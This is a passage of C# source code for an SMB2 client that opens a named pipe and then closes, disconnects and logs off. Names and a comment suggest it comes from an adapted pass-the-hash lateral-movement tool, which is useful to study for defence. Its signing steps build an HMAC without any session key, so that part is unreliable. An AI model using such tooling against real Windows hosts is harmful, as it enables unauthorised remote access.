                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CreateRequest";
                                    }
                                    break;
                                case "CreateRequest":
                                    {
                                        SMB2_Tree_ID = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                        byte[] pipeBytes = Encoding.UTF8.GetBytes(pipename);
                                        List<byte> PTH_Pipe_List = new List<byte>();
                                        foreach (byte pipeByte in pipeBytes)
                                        {
                                            PTH_Pipe_List.Add(pipeByte);
                                            PTH_Pipe_List.Add(0x00);

                                        }
                                        SMB_Named_Pipe_Bytes = PTH_Pipe_List.ToArray();
                                        // SMB_Named_Pipe_Bytes = new byte[] { 0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x70, 0x00, 0x69, 0x00, 0x70, 0x00, 0x65, 0x00 }; //testpipes, original was svcctl
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x05, 0x0 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBConnect.SMB2CreateRequestFile(SMB_Named_Pipe_Bytes);
                                        Packet_SMB2_Data["SMB2CreateRequestFIle_Share_Access"] = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CloseRequest";
                                    }
                                    break;


                                case "StatusPending":
                                    {
                                        SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_Client_Stage_Next;
                                        }
                                    }
                                    break;



                                case "CloseRequest":
                                    {
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x06, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;

                                case "TreeDisconnect":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x04, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBConnect.SMB2TreeDisconnectRequest();
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x02, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBConnect.SMB2SessionLogoffRequest();
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();

                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }
                        }
                    }
                }
                SMBClient.Close();
                SMBClientStream.Close();
            }

            Console.WriteLine(output.ToString());
        }


        private static byte[] SendStream(NetworkStream stream, byte[] BytesToSend)
        {
            byte[] BytesReceived = new byte[2048];
            stream.Write(BytesToSend, 0, BytesToSend.Length);
            stream.Flush();
            stream.Read(BytesReceived, 0, BytesReceived.Length);
            return BytesReceived;
        }

        private static byte[] GetNetBIOSSessionService(int SMB_Header_Length, int RPC_Data_Length)
        {
            OrderedDictionary Packet_NetBIOS_Session_Service = SMBConnect.NetBIOSSessionService(SMB_Header_Length, RPC_Data_Length);
            byte[] NetBIOS_Session_Service = Utilities.ConvertFromPacketOrderedDictionary(Packet_NetBIOS_Session_Service);
            return NetBIOS_Session_Service;

        }

    }
}
